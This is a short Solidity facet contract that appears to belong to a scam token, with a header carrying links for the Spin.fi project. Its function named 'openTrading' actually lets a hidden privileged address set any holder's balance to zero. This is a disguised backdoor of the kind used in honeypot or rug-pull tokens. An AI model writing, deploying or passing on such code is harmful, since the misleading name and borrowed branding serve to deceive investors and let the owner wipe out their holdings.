/*
 * SPDX-License-Identifier: MIT
 * Website: https://spin.fi/?utm_source=icodrops
 * Github: https://github.com/spin-fi/
 * Twitter: https://twitter.com/spin_fi
 * Telegram: https://t.me/spin_fi_chat
 * Medium: https://spin-fi.medium.com/
 * Discord: https://discord.gg/e3jUf3dDZu
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
